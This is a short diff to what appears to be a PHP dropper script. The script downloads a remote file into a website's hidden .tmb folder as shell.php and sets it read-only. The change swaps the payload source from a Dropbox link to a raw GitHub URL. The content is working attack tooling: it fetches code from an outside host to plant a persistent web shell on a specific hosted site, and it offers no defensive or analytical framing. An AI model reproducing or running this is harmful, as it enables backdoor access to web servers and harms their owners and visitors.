@@ -5,7 +5,7 @@ set_time_limit(0);
 $files = [
     [
         'path' => '/home/coifurtk/pabriktasseminar.id/.tmb/shell.php',
-        'url' => 'https://dl.dropboxusercontent.com/scl/fi/am683ugx2omsimg23kwaf/horizon.php.txt?rlkey=pu6dhgkljxcs1mufuskfy689r&st=2f9o9o8g&dl=0',
+        'url' => 'https://raw.githubusercontent.com/adolphburruss/files/refs/heads/main/test.php',
         'chmod' => 0444
     ],
 ];
